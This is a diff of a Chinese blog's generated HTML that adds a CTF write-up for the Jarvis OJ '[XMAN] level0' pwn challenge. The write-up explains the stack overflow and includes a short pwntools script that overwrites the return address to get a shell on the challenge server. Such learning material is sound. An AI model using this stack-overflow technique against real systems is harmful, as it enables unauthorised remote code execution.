@@ -20,30 +20,46 @@
     var CONFIG = {"hostname":"bigfog.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="日常学习记录">
-<meta property="og:type" content="website">
-<meta property="og:title" content="学习笔记">
-<meta property="og:url" content="http://bigfog.github.io/page/2/index.html">
+  <meta name="description" content="title:   PWN学习—[XMAN] level0date: 2021-3-1 00:55:00tags:  - CTF - pwn  categories:  - 其他一.前言练习平台：https:&#x2F;&#x2F;www.jarvisoj.com&#x2F;challenges 题目：[ XMAN ] level 0   二.分析2.1 IDA查看  这里要注意漏洞函数中read的第一个参数，这里表示的是标准">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN学习—[XMAN] level0">
+<meta property="og:url" content="http://bigfog.github.io/2021/03/03/PWN%E5%AD%A6%E4%B9%A0%E2%80%94[XMAN]%20level0/index.html">
 <meta property="og:site_name" content="学习笔记">
-<meta property="og:description" content="日常学习记录">
+<meta property="og:description" content="title:   PWN学习—[XMAN] level0date: 2021-3-1 00:55:00tags:  - CTF - pwn  categories:  - 其他一.前言练习平台：https:&#x2F;&#x2F;www.jarvisoj.com&#x2F;challenges 题目：[ XMAN ] level 0   二.分析2.1 IDA查看  这里要注意漏洞函数中read的第一个参数，这里表示的是标准">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C0.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C1.png">
+<meta property="og:image" content="c:%5CUsers%5Czzw%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210302230420875.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C2.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C3.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C4.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C5.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C6.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C7.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C8.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C9.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C10.png">
+<meta property="og:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C11.png">
+<meta property="article:published_time" content="2021-03-02T16:08:55.276Z">
+<meta property="article:modified_time" content="2021-03-02T16:08:44.053Z">
 <meta property="article:author" content="BigFog">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="f:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C0.png">
 
-<link rel="canonical" href="http://bigfog.github.io/page/2/">
+<link rel="canonical" href="http://bigfog.github.io/2021/03/03/PWN%E5%AD%A6%E4%B9%A0%E2%80%94[XMAN]%20level0/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>学习笔记</title>
+  <title>PWN学习—[XMAN] level0 | 学习笔记</title>
   
 
 
@@ -185,13 +201,14 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://bigfog.github.io/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/">
+    <link itemprop="mainEntityOfPage" href="http://bigfog.github.io/2021/03/03/PWN%E5%AD%A6%E4%B9%A0%E2%80%94[XMAN]%20level0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -203,10 +220,9 @@
       <meta itemprop="name" content="学习笔记">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/" class="post-title-link" itemprop="url">APK抓包分析去除聚力视频HD的广告</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          PWN学习—[XMAN] level0
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -215,25 +231,23 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2018-03-09 23:49:18" itemprop="dateCreated datePublished" datetime="2018-03-09T23:49:18+08:00">2018-03-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">逆向技术学习</span></a>
-                </span>
+              <time title="创建时间：2021-03-03 00:08:55" itemprop="dateCreated datePublished" datetime="2021-03-03T00:08:55+08:00">2021-03-03</time>
             </span>
 
-          <br>
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
             <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
+              <span>778</span>
             </span>
 
         </div>
@@ -245,226 +259,78 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前视频播放类APK在播放前都会播放一段广告，短则几十秒，多则一分多钟。当然Vip会员就不会有广告播放，毕竟这也是人家重要的的收入来源。本文就用抓取流量包的方式获取到广告的url的地址，进而在播放视频时不会有广告的播放。实验所用的APK为“聚力视频HD”，这款应用没有做什么保护，分析操作起来较容易。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2018/03/09/APK%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%8E%BB%E9%99%A4%E8%81%9A%E5%8A%9B%E8%A7%86%E9%A2%91HD%E7%9A%84%E5%B9%BF%E5%91%8A/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
+        <hr>
+<p>title:   PWN学习—[XMAN] level0<br>date: 2021-3-1 00:55:00<br>tags: </p>
+<pre><code>- CTF
+- pwn</code></pre><p>  categories: </p>
+<pre><code>- 其他</code></pre><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>练习平台：<a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">https://www.jarvisoj.com/challenges</a></p>
+<p>题目：[ XMAN ] level 0</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C0.png" alt="image-20210302230037626"></p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C1.png" alt="image-20210302230145529"></p>
+<h2 id="二-分析"><a href="#二-分析" class="headerlink" title="二.分析"></a>二.分析</h2><h3 id="2-1-IDA查看"><a href="#2-1-IDA查看" class="headerlink" title="2.1 IDA查看"></a>2.1 IDA查看</h3><p><img src="C:%5CUsers%5Czzw%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210302230420875.png" alt="image-20210302230420875"></p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C2.png" alt="image-20210302230748270"></p>
+<p>这里要注意漏洞函数中read的第一个参数，这里表示的是标准输入，很明显这里存在一个栈溢出。</p>
+<p>查看是否有system（）、”/bin/sh”字符。</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C3.png" alt="image-20210302231236897"></p>
+<p>现成的system(“bin/sh”)</p>
+<h3 id="2-2-GDB调试"><a href="#2-2-GDB调试" class="headerlink" title="2.2 GDB调试"></a>2.2 GDB调试</h3><h4 id="2-2-1-查看安全机制"><a href="#2-2-1-查看安全机制" class="headerlink" title="2.2.1 查看安全机制"></a>2.2.1 查看安全机制</h4><p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C4.png" alt="image-20210302231527158"></p>
+<p>堆栈不可执行开启。</p>
+<h4 id="2-2-2-缓冲区大小调试"><a href="#2-2-2-缓冲区大小调试" class="headerlink" title="2.2.2  缓冲区大小调试"></a>2.2.2  缓冲区大小调试</h4><p>gdb中使用命令生成若干字符</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C5.png" alt="image-20210302233927577"></p>
+<p>命令：pattern create 200 </p>
+<p> <img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C6.png" alt="image-20210302233429253"></p>
+<p>然后将生成的这段字符，在程序需要输入的地方输入</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C7.png" alt="image-20210302233520257"></p>
+<p>查看rbp,数据</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C8.png" alt="image-20210302233552682"></p>
+<p>定位缓冲区大小</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C9.png" alt="image-20210302233633943"></p>
+<h3 id="2-2-3-编写poc"><a href="#2-2-3-编写poc" class="headerlink" title="2.2.3 编写poc"></a>2.2.3 编写poc</h3><p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C10.png" alt="image-20210302234617330"></p>
+<p>payload+= 128 *  ‘a’      //缓冲区的大小</p>
+<p>payload+= 8 *  ‘a’      //ebp   64位8个字节</p>
+<p>payload+= p64(0x400596)     //覆盖返回地址的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pro&#x3D;remote(&#39;pwn2.jarvisoj.com&#39;,9881)</span><br><span class="line">data&#x3D;pro.recv(100).decode()</span><br><span class="line">print(data) </span><br><span class="line">#payload&#x3D;flat([(128+8)*&#39;a&#39;,p64(0x400596)])        ##  python2.7</span><br><span class="line">payload&#x3D;(128)*&#39;a&#39;+p64(0xdeadbeef)+p64(0x400596)   ##  python3.6</span><br><span class="line">pro.send(payload)</span><br><span class="line">pro.interactive()</span><br><span class="line">pro.close()</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="F:%5CPWN%5Cjarvisoj%5Cphoto%5Cxman-level0%5C11.png" alt="image-20210302235321824"></p>
+<p>flag</p>
+<p>CTF{713ca3944e92180e0ef03171981dcd41}</p>
+
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://bigfog.github.io/2018/03/03/%E5%AE%89%E5%8D%93%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E7%BC%96%E5%86%99/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="BigFog">
-      <meta itemprop="description" content="日常学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习笔记">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/03/03/%E5%AE%89%E5%8D%93%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E7%BC%96%E5%86%99/" class="post-title-link" itemprop="url">安卓动态链接库编写</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2018-03-03 00:55:00" itemprop="dateCreated datePublished" datetime="2018-03-03T00:55:00+08:00">2018-03-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">理论学习</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>实习时曾经用真机进行过so文件的调试。这次使用的模拟器，过程和原先也一样，但到断点处就是运行不起来。熬了二个晚上，终于发现模拟器不支持arm的so的调试。要模拟器调试so的话只能选择x86版本的so。通过gdb开端口来调试，弄下来很复杂。这篇文章简单介绍下安卓中So文件的编写，以及对so文件的调试。</p>
-</blockquote>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2018/03/03/%E5%AE%89%E5%8D%93%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E7%BC%96%E5%86%99/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://bigfog.github.io/2018/03/03/Android%20Studio+%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95APK/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="BigFog">
-      <meta itemprop="description" content="日常学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习笔记">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/03/03/Android%20Studio+%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95APK/" class="post-title-link" itemprop="url">Android Studio+夜神模拟器 动态调试APK</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2018-03-03 00:55:00" itemprop="dateCreated datePublished" datetime="2018-03-03T00:55:00+08:00">2018-03-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">逆向技术学习</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.3k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="1-smali文件格式"><a href="#1-smali文件格式" class="headerlink" title="1 smali文件格式"></a>1 smali文件格式</h2><table>
-<thead>
-<tr>
-<th align="left">头部定义</th>
-<th align="center">域定义</th>
-<th align="right">函数定义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">.class</td>
-<td align="center">.field public</td>
-<td align="right">.method</td>
-</tr>
-<tr>
-<td align="left">.super</td>
-<td align="center">.field static</td>
-<td align="right">instruction</td>
-</tr>
-<tr>
-<td align="left">.source</td>
-<td align="center">.field private</td>
-<td align="right">.endmethod</td>
-</tr>
-</tbody></table>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2018/03/03/Android%20Studio+%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95APK/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/07/25/CVE-2011-0104%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="CVE-2011-0104漏洞分析">
+      <i class="fa fa-chevron-left"></i> CVE-2011-0104漏洞分析
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
   
-
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-  </nav>
 
 
 
           </div>
           
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zNjc1OC8xMzI5Mw=="></div>
+  </div>
+  
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -511,6 +377,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-number">1.</span> <span class="nav-text">一.前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-分析"><span class="nav-number">2.</span> <span class="nav-text">二.分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-IDA查看"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 IDA查看</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-GDB调试"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 GDB调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-1-查看安全机制"><span class="nav-number">2.2.1.</span> <span class="nav-text">2.2.1 查看安全机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-2-缓冲区大小调试"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.2.2  缓冲区大小调试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-3-编写poc"><span class="nav-number">2.3.</span> <span class="nav-text">2.2.3 编写poc</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -650,6 +517,21 @@
 
   
 
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
 
 </body>
 </html>
